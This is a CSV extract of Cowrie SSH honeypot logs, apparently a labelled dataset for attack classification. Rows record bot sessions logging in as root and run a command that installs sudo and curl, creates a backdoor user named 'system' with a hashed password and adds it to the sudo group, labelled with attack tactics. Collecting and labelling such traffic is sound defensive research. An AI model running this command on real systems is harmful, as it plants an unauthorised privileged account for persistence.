,event,session_id,session,labels
1123,"{""duration"": ""0.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T09:13:47.578990Z"", ""session_id"": ""8f2e06ac7276""}",8f2e06ac7276,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 pSeg5Ree) system  && sudo usermod -aG sudo system ; openssl passwd -1 pSeg5Ree;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1124,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:37794 (10.42.6.15:2222) [session: 67bb5cb6f4a7]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 37794.0, ""timestamp"": ""2025-08-08T13:39:29.985799Z"", ""session_id"": ""67bb5cb6f4a7""}",67bb5cb6f4a7,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system  && sudo usermod -aG sudo system ; openssl passwd -1 kMnyBaDZ;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1125,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T13:39:29.987463Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""67bb5cb6f4a7""}",67bb5cb6f4a7,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system  && sudo usermod -aG sudo system ; openssl passwd -1 kMnyBaDZ;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1126,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T13:39:29.999797Z"", ""session_id"": ""67bb5cb6f4a7""}",67bb5cb6f4a7,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system  && sudo usermod -aG sudo system ; openssl passwd -1 kMnyBaDZ;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1127,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T13:39:30.040724Z"", ""username"": ""root"", ""session_id"": ""67bb5cb6f4a7""}",67bb5cb6f4a7,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system  && sudo usermod -aG sudo system ; openssl passwd -1 kMnyBaDZ;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1128,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T13:39:30.207495Z"", ""session_id"": ""67bb5cb6f4a7""}",67bb5cb6f4a7,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system  && sudo usermod -aG sudo system ; openssl passwd -1 kMnyBaDZ;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1129,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T13:39:30.208123Z"", ""session_id"": ""67bb5cb6f4a7""}",67bb5cb6f4a7,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system  && sudo usermod -aG sudo system ; openssl passwd -1 kMnyBaDZ;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1130,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 kMnyBaDZ"", ""message"": ""CMD: openssl passwd -1 kMnyBaDZ"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T13:39:30.208689Z"", ""session_id"": ""67bb5cb6f4a7""}",67bb5cb6f4a7,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system  && sudo usermod -aG sudo system ; openssl passwd -1 kMnyBaDZ;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1131,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 kMnyBaDZ"", ""message"": ""Command not found: openssl passwd -1 kMnyBaDZ"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T13:39:30.209508Z"", ""session_id"": ""67bb5cb6f4a7""}",67bb5cb6f4a7,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system  && sudo usermod -aG sudo system ; openssl passwd -1 kMnyBaDZ;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1132,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/eeffda4f8132780a04202421f0cce296d67b67d38cf0a7c210cde3236ba4bf0b after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""eeffda4f8132780a04202421f0cce296d67b67d38cf0a7c210cde3236ba4bf0b"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T13:39:30.222555Z"", ""ttylog"": ""var/lib/cowrie/tty/eeffda4f8132780a04202421f0cce296d67b67d38cf0a7c210cde3236ba4bf0b"", ""session_id"": ""67bb5cb6f4a7""}",67bb5cb6f4a7,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system  && sudo usermod -aG sudo system ; openssl passwd -1 kMnyBaDZ;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1133,"{""duration"": ""0.2"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.2 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T13:39:30.223434Z"", ""session_id"": ""67bb5cb6f4a7""}",67bb5cb6f4a7,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 kMnyBaDZ) system  && sudo usermod -aG sudo system ; openssl passwd -1 kMnyBaDZ;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1134,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:11977 (10.42.6.15:2222) [session: b2dbab36a2a2]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 11977.0, ""timestamp"": ""2025-08-08T17:14:16.160293Z"", ""session_id"": ""b2dbab36a2a2""}",b2dbab36a2a2,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system  && sudo usermod -aG sudo system ; openssl passwd -1 hqmHXsD4;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1135,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T17:14:16.161897Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""b2dbab36a2a2""}",b2dbab36a2a2,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system  && sudo usermod -aG sudo system ; openssl passwd -1 hqmHXsD4;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1136,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T17:14:16.167581Z"", ""session_id"": ""b2dbab36a2a2""}",b2dbab36a2a2,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system  && sudo usermod -aG sudo system ; openssl passwd -1 hqmHXsD4;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1137,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T17:14:16.188241Z"", ""username"": ""root"", ""session_id"": ""b2dbab36a2a2""}",b2dbab36a2a2,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system  && sudo usermod -aG sudo system ; openssl passwd -1 hqmHXsD4;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1138,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T17:14:16.418853Z"", ""session_id"": ""b2dbab36a2a2""}",b2dbab36a2a2,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system  && sudo usermod -aG sudo system ; openssl passwd -1 hqmHXsD4;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1139,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T17:14:16.419456Z"", ""session_id"": ""b2dbab36a2a2""}",b2dbab36a2a2,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system  && sudo usermod -aG sudo system ; openssl passwd -1 hqmHXsD4;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1140,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 hqmHXsD4"", ""message"": ""CMD: openssl passwd -1 hqmHXsD4"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T17:14:16.420048Z"", ""session_id"": ""b2dbab36a2a2""}",b2dbab36a2a2,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system  && sudo usermod -aG sudo system ; openssl passwd -1 hqmHXsD4;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1141,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 hqmHXsD4"", ""message"": ""Command not found: openssl passwd -1 hqmHXsD4"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T17:14:16.420778Z"", ""session_id"": ""b2dbab36a2a2""}",b2dbab36a2a2,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system  && sudo usermod -aG sudo system ; openssl passwd -1 hqmHXsD4;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1142,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/7b07912ff708e8fe2726034dca5278478d79b0db0cf30742f78aee1cae34abd1 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""7b07912ff708e8fe2726034dca5278478d79b0db0cf30742f78aee1cae34abd1"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T17:14:16.426981Z"", ""ttylog"": ""var/lib/cowrie/tty/7b07912ff708e8fe2726034dca5278478d79b0db0cf30742f78aee1cae34abd1"", ""session_id"": ""b2dbab36a2a2""}",b2dbab36a2a2,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system  && sudo usermod -aG sudo system ; openssl passwd -1 hqmHXsD4;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1143,"{""duration"": ""0.3"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.3 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T17:14:16.427817Z"", ""session_id"": ""b2dbab36a2a2""}",b2dbab36a2a2,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 hqmHXsD4) system  && sudo usermod -aG sudo system ; openssl passwd -1 hqmHXsD4;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1144,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:31735 (10.42.6.15:2222) [session: cea175b69487]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 31735.0, ""timestamp"": ""2025-08-08T05:22:44.830785Z"", ""session_id"": ""cea175b69487""}",cea175b69487,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system  && sudo usermod -aG sudo system ; openssl passwd -1 rCzgvWym;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1145,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T05:22:44.832314Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""cea175b69487""}",cea175b69487,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system  && sudo usermod -aG sudo system ; openssl passwd -1 rCzgvWym;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1146,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T05:22:44.838197Z"", ""session_id"": ""cea175b69487""}",cea175b69487,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system  && sudo usermod -aG sudo system ; openssl passwd -1 rCzgvWym;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1147,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T05:22:44.858485Z"", ""username"": ""root"", ""session_id"": ""cea175b69487""}",cea175b69487,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system  && sudo usermod -aG sudo system ; openssl passwd -1 rCzgvWym;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1148,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T05:22:44.911923Z"", ""session_id"": ""cea175b69487""}",cea175b69487,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system  && sudo usermod -aG sudo system ; openssl passwd -1 rCzgvWym;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1149,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T05:22:44.912576Z"", ""session_id"": ""cea175b69487""}",cea175b69487,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system  && sudo usermod -aG sudo system ; openssl passwd -1 rCzgvWym;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1150,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 rCzgvWym"", ""message"": ""CMD: openssl passwd -1 rCzgvWym"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T05:22:44.913130Z"", ""session_id"": ""cea175b69487""}",cea175b69487,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system  && sudo usermod -aG sudo system ; openssl passwd -1 rCzgvWym;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1151,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 rCzgvWym"", ""message"": ""Command not found: openssl passwd -1 rCzgvWym"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T05:22:44.913923Z"", ""session_id"": ""cea175b69487""}",cea175b69487,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system  && sudo usermod -aG sudo system ; openssl passwd -1 rCzgvWym;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1152,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/b9330a4311daf68b51967cabd3f0737d3a7c3aac8d39ae8207a7b15766128dda after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""b9330a4311daf68b51967cabd3f0737d3a7c3aac8d39ae8207a7b15766128dda"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T05:22:44.920088Z"", ""ttylog"": ""var/lib/cowrie/tty/b9330a4311daf68b51967cabd3f0737d3a7c3aac8d39ae8207a7b15766128dda"", ""session_id"": ""cea175b69487""}",cea175b69487,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system  && sudo usermod -aG sudo system ; openssl passwd -1 rCzgvWym;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1153,"{""duration"": ""0.1"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.1 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-08T05:22:44.920936Z"", ""session_id"": ""cea175b69487""}",cea175b69487,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 rCzgvWym) system  && sudo usermod -aG sudo system ; openssl passwd -1 rCzgvWym;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1154,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:43770 (10.42.4.33:2222) [session: bd2fcde9322f]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 43770.0, ""timestamp"": ""2025-08-04T23:41:39.236122Z"", ""session_id"": ""bd2fcde9322f""}",bd2fcde9322f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system  && sudo usermod -aG sudo system ; openssl passwd -1 XfGr7vMY;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
1155,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-04T23:41:39.236611Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""bd2fcde9322f""}",bd2fcde9322f,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 XfGr7vMY) system  && sudo usermod -aG sudo system ; openssl passwd -1 XfGr7vMY;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Command and Control']"
